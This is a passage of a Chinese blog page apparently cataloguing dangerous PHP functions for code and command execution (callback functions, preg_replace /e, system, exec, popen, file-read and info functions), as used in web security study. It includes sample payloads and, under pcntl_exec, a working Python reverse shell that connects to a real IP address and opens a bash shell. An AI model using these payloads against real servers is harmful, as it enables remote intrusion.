+
+<h4 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h4><blockquote>
+<p>usort — 使用用户自定义的比较函数对数组中的值进行排序</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.usort.php">https://www.php.net/manual/zh/function.usort.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">usort</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>): <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$a</span>, <span class="title function_ invoke__">phpinfo</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//usort($a, system(&quot;whoami&quot;));</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="uasort"><a href="#uasort" class="headerlink" title="uasort()"></a>uasort()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">uasort</span>(<span class="variable">$a</span>, <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="uksort"><a href="#uksort" class="headerlink" title="uksort()"></a>uksort()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">uksort</span>(<span class="variable">$a</span>, <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h4><blockquote>
+<p>array_filter — 使用回调函数过滤数组的元素</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.array-filter.php">https://www.php.net/manual/zh/function.array-filter.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span> <span class="variable">$array</span>, ?<span class="keyword">callable</span> <span class="variable">$callback</span> = <span class="literal">null</span>, <span class="keyword">int</span> <span class="variable">$mode</span> = <span class="number">0</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>遍历 <code>array</code> 数组中的每个值，并将每个值传递给 <code>callback</code> 回调函数。 如果 <code>callback</code> 回调函数返回 <strong><code>true</code></strong>，则将 <code>array</code> 数组中的当前值返回到结果 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.array.php">array</a> 数组中。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="variable">$a</span>, <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="array-reduce"><a href="#array-reduce" class="headerlink" title="array_reduce()"></a>array_reduce()</h4><blockquote>
+<p>array_reduce — 用回调函数迭代地将数组简化为单一的值</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.array-reduce.php">https://www.php.net/manual/zh/function.array-reduce.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_reduce</span>(<span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$initial</span> = <span class="literal">null</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">array_reduce</span>(<span class="variable">$a</span>, <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><blockquote>
+<p>preg_replace — 执行一个正则表达式的搜索和替换</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.preg-replace.php">https://www.php.net/manual/zh/function.preg-replace.php</a></p>
+</blockquote>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/07/preg_replace.html">PHP preg_系列漏洞小结 | 国光</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/2239">深入研究preg_replace与代码执行-先知社区</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+<p>搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分，以 <code>replacement</code> 进行替换。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&quot;pattern&quot;</span>], <span class="variable">$_GET</span>[<span class="string">&quot;new&quot;</span>], <span class="variable">$_GET</span>[<span class="string">&quot;base&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">?pattern=/<span class="number">233</span>/e&amp;<span class="keyword">new</span>=<span class="title function_ invoke__">phpinfo</span>()&amp;base=<span class="number">233</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h3><blockquote>
+<p>ob_start — 打开输出控制缓冲</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.ob-start.php">https://www.php.net/manual/zh/function.ob-start.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ob_start</span>(?<span class="keyword">callable</span> <span class="variable">$callback</span> = <span class="literal">null</span>, <span class="keyword">int</span> <span class="variable">$chunk_size</span> = <span class="number">0</span>, <span class="keyword">int</span> <span class="variable">$flags</span> = PHP_OUTPUT_HANDLER_STDFLAGS): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><blockquote>
+<p>system — 执行外部程序，并且显示输出</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.system.php">https://www.php.net/manual/zh/function.system.php</a></p>
+</blockquote>
+<ul>
+<li>同 C 版本的 <strong>system()</strong> 函数一样，本函数执行 <code>command</code> 参数所指定的命令，并且输出执行结果。</li>
+<li><strong><code>system()</code> 函数总是返回 <code>NULL</code></strong>（无论命令是否成功执行）。</li>
+</ul>
+<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><blockquote>
+<p>passthru — 执行外部程序并且显示原始输出</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.passthru.php">https://www.php.net/manual/zh/function.passthru.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): ?<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><blockquote>
+<p>shell_exec — 通过 shell 执行命令并将完整的输出以字符串的方式返回</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.shell-exec.php">https://www.php.net/manual/zh/function.shell-exec.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span>|<span class="literal">false</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>本函数同<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.execution.php">执行运算符</a></li>
+</ul>
+<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><blockquote>
+<p>exec — 执行一个外部程序</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exec.php">https://www.php.net/manual/zh/function.exec.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">array</span> &amp;<span class="variable">$output</span> = <span class="literal">null</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>command</code></p>
+<p>要执行的命令</p>
+</li>
+<li><p>返回值</p>
+<p>命令执行结果的最后一行内容。</p>
+</li>
+</ul>
+<h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h3><blockquote>
+<p>pcntl_exec — 在当前进程空间执行指定程序</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.pcntl-exec.php">https://www.php.net/manual/zh/function.pcntl-exec.php</a></p>
+<p>条件：PHP安装并启用了 pcntl 插件</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">pcntl_exec</span>(<span class="keyword">string</span> <span class="variable">$path</span>, <span class="keyword">array</span> <span class="variable">$args</span> = [], <span class="keyword">array</span> <span class="variable">$env_vars</span> = []): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>path</code></p>
+<p><code>path</code> 必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本（比如文件第一行是 #!&#x2F;usr&#x2F;local&#x2F;bin&#x2F;perl 的 perl 脚本）。 更多的信息请查看您系统的 execve（2）手册。</p>
+</li>
+<li><p><code>args</code></p>
+<p><code>args</code> 是一个要传递给程序的参数的字符串数组。</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">pcntl_exec</span>( <span class="string">&quot;/bin/bash&quot;</span> , <span class="keyword">array</span>(<span class="string">&quot;whoami&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/usr/bin/python&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;115.236.153.172&quot;,41678));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><blockquote>
+<p>popen — 打开进程文件指针</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.popen.php">https://www.php.net/manual/zh/function.popen.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">popen</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">string</span> <span class="variable">$mode</span>): resource|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">popen</span>(<span class="string">&quot;ls &gt; ./1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>直接查看执行结果，通过一下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  <span class="variable">$test</span> = <span class="string">&quot;whoami&quot;</span>;  </span><br><span class="line">  <span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$test</span>,<span class="string">&quot;r&quot;</span>);  <span class="comment">//popen打一个进程通道  </span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;      <span class="comment">//从通道取出内容 </span></span><br><span class="line">    <span class="variable">$out</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">4096</span>);  </span><br><span class="line">    <span class="keyword">echo</span>  <span class="variable">$out</span>;          </span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><blockquote>
+<p>proc_open — 执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.proc-open.php">https://www.php.net/manual/zh/function.proc-open.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">proc_open</span>(</span><br><span class="line">    <span class="keyword">array</span>|<span class="keyword">string</span> <span class="variable">$command</span>,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$descriptor_spec</span>,</span><br><span class="line">    <span class="keyword">array</span> &amp;<span class="variable">$pipes</span>,</span><br><span class="line">    ?<span class="keyword">string</span> <span class="variable">$cwd</span> = <span class="literal">null</span>,</span><br><span class="line">    ?<span class="keyword">array</span> <span class="variable">$env_vars</span> = <span class="literal">null</span>,</span><br><span class="line">    ?<span class="keyword">array</span> <span class="variable">$options</span> = <span class="literal">null</span></span><br><span class="line">): resource|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>类似 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.popen.php">popen()</a> 函数， 但是 <strong>proc_open()</strong> 提供了更加强大的控制程序执行的能力。</li>
+</ul>
+<h2 id="文件系统相关扩展"><a href="#文件系统相关扩展" class="headerlink" title="文件系统相关扩展"></a>文件系统相关扩展</h2><h3 id="目录函数"><a href="#目录函数" class="headerlink" title="目录函数"></a>目录函数</h3><h4 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a>chdir()</h4><blockquote>
+<p>chdir — 改变目录</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.chdir.php">https://www.php.net/manual/zh/function.chdir.php</a></p>
+</blockquote>
+<h4 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h4><blockquote>
+<p>scandir — 列出指定路径中的文件和目录</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.scandir.php">https://www.php.net/manual/zh/function.scandir.php</a></p>
+</blockquote>
+<h3 id="读写文件函数"><a href="#读写文件函数" class="headerlink" title="读写文件函数"></a>读写文件函数</h3><h4 id="file"><a href="#file" class="headerlink" title="file()"></a>file()</h4><blockquote>
+<p>file — 把整个文件读入一个数组中</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file.php">https://www.php.net/manual/zh/function.file.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span>, ?resource <span class="variable">$context</span> = <span class="literal">null</span>): <span class="keyword">array</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如已启用<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen">fopen 包装器</a>，在此函数中， URL 可作为文件名。关于如何指定文件名详见 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a>。各种 wapper 的不同功能请参见 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">支持的协议和封装协议</a>，注意其用法及其可提供的预定义变量。</li>
+</ul>
+<h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><blockquote>
+<p>file_get_contents — 将整个文件读入一个字符串</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file-get-contents.php">https://www.php.net/manual/zh/function.file-get-contents.php</a></p>
+</blockquote>
+<ul>
+<li>如果要打开有特殊字符的 URL （比如说有空格），就需要使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.urlencode.php">urlencode()</a> 进行 URL 编码。</li>
+<li>如已启用<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen">fopen 包装器</a>，在此函数中， URL 可作为文件名。关于如何指定文件名详见 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a>。各种 wapper 的不同功能请参见 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">支持的协议和封装协议</a>，注意其用法及其可提供的预定义变量。</li>
+</ul>
+<h4 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h4><blockquote>
+<p>file_put_contents — 将数据写入文件</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file-put-contents.php">https://www.php.net/manual/zh/function.file-put-contents.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$filename</span>,</span><br><span class="line">    <span class="keyword">mixed</span> <span class="variable">$data</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span>,</span><br><span class="line">    ?resource <span class="variable">$context</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">int</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>data<br>要写入的数据。类型可以是 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.string.php">string</a>，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.array.php">array</a> 或者是 stream 资源（如上面所说的那样）。</p>
+<p>如果 <code>data</code> 指定为 stream 资源，这里 stream 中所保存的缓存数据将被写入到指定文件中，这种用法就相似于使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.stream-copy-to-stream.php">stream_copy_to_stream()</a> 函数。</p>
+<p>参数 <code>data</code> 可以是数组（但不能为多维数组），这就相当于 <code>file_put_contents($filename, join(&#39;&#39;, $array))</code>。</p>
+</li>
+<li><p>如已启用<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen">fopen 包装器</a>，在此函数中， URL 可作为文件名。关于如何指定文件名详见 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a>。各种 wapper 的不同功能请参见 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">支持的协议和封装协议</a>，注意其用法及其可提供的预定义变量。</p>
+</li>
+</ul>
+<h4 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h4><blockquote>
+<p>readfile — 输出文件</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.readfile.php">https://www.php.net/manual/zh/function.readfile.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, <span class="keyword">bool</span> <span class="variable">$use_include_path</span> = <span class="literal">false</span>, ?resource <span class="variable">$context</span> = <span class="literal">null</span>): <span class="keyword">int</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如已启用<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen">fopen 包装器</a>，在此函数中， URL 可作为文件名。关于如何指定文件名详见 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a>。各种 wapper 的不同功能请参见 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">支持的协议和封装协议</a>，注意其用法及其可提供的预定义变量。</li>
+</ul>
+<h4 id="readgzfile"><a href="#readgzfile" class="headerlink" title="readgzfile()"></a>readgzfile()</h4><blockquote>
+<p>输出一个gz文件</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.readgzfile.php">https://www.php.net/manual/zh/function.readgzfile.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readgzfile</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, <span class="keyword">bool</span> <span class="variable">$use_include_path</span> = <span class="literal">false</span>): <span class="keyword">int</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>读取文件，解压缩并将其写入标准输出。</p>
+</li>
+<li><p>readgzfile（）可以用来读取一个不是gzip格式的文件;在这种情况下，readgzfile（）将直接从文件中读取而不解压缩。</p>
+</li>
+</ul>
+<h2 id="敏感信息函数"><a href="#敏感信息函数" class="headerlink" title="敏感信息函数"></a>敏感信息函数</h2><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo()"></a>phpinfo()</h3><blockquote>
+<p>phpinfo — 输出关于 PHP 配置的信息</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.phpinfo.php">https://www.php.net/manual/zh/function.phpinfo.php</a></p>
+</blockquote>
+<h3 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h3><blockquote>
+<p>getenv — 获取单个或者全部环境变量</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.getenv.php">https://www.php.net/manual/zh/function.getenv.php</a></p>
+</blockquote>
+<h3 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd()"></a>getcwd()</h3><blockquote>
+<p>getcwd — 取得当前工作目录</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.getcwd.php">https://www.php.net/manual/zh/function.getcwd.php</a></p>
+</blockquote>
+<h3 id="phpversion"><a href="#phpversion" class="headerlink" title="phpversion()"></a>phpversion()</h3><blockquote>
+<p>phpversion — 获取当前的PHP版本</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.phpversion.php">https://www.php.net/manual/zh/function.phpversion.php</a></p>
+</blockquote>
+<h3 id="get-loaded-extensions"><a href="#get-loaded-extensions" class="headerlink" title="get_loaded_extensions()"></a>get_loaded_extensions()</h3><blockquote>
+<p>该函数返回了 PHP 解析器里所有编译并加载的模块名。</p>
+</blockquote>
+<h2 id="环境变量相关函数"><a href="#环境变量相关函数" class="headerlink" title="环境变量相关函数"></a>环境变量相关函数</h2><h3 id="putenv"><a href="#putenv" class="headerlink" title="putenv()"></a>putenv()</h3><blockquote>
+<p>putenv — 设置环境变量的值</p>
+</blockquote>
+<h2 id="php不需要括号的敏感函数-关键字"><a href="#php不需要括号的敏感函数-关键字" class="headerlink" title="php不需要括号的敏感函数&#x2F;关键字"></a><code>php</code>不需要括号的敏感函数&#x2F;关键字</h2><table>
+<thead>
+<tr>
+<th>语言结构</th>
+<th>说明</th>
+<th>推荐写法</th>
+<th>错误&#x2F;不推荐写法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>echo</code></td>
+<td>输出一个或多个字符串</td>
+<td><code>echo &quot;hello&quot;;</code> <code>echo &quot;a&quot;, &quot;b&quot;;</code></td>
+<td><code>echo(&quot;hello&quot;);</code>（虽合法但冗余）</td>
+</tr>
+<tr>
+<td><code>print</code></td>
+<td>输出一个字符串（有返回值）</td>
+<td><code>print &quot;hello&quot;;</code></td>
+<td><code>print(&quot;hello&quot;);</code></td>
+</tr>
+<tr>
+<td><code>include</code> &#x2F; <code>require</code></td>
+<td>包含文件</td>
+<td><code>include &#39;a.php&#39;;</code></td>
+<td><code>include(&#39;a&#39;);</code></td>
+</tr>
+<tr>
+<td><code>include_once</code> &#x2F; <code>require_once</code></td>
+<td>一次性包含</td>
+<td><code>require_once &#39;lib.php&#39;;</code></td>
+<td><code>require_once(&#39;lib.php&#39;);</code></td>
+</tr>
+<tr>
+<td><code>exit</code> &#x2F; <code>die</code></td>
+<td>终止脚本</td>
+<td><code>exit;</code> 或 <code>exit(&quot;msg&quot;);</code></td>
+<td><code>exit(&quot;msg&quot;);</code>（带参数时括号合法但非必须）</td>
+</tr>
+<tr>
+<td><code>return</code></td>
+<td>返回值</td>
+<td><code>return $x;</code></td>
+<td><code>return($x);</code>（合法但冗余）</td>
+</tr>
+</tbody></table>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
